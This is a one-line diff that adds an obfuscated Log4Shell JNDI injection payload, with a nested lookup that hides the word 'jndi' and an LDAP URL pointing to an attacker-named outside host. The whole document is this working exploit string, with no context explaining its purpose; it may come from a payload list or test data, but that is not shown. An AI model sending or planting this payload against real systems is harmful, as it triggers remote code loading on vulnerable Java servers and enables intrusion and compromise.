@@ -1,0 +1,1 @@
+${jnd${sys:SYS_NAME:-i}:ldap:/somesitehackerofhell.com/z}
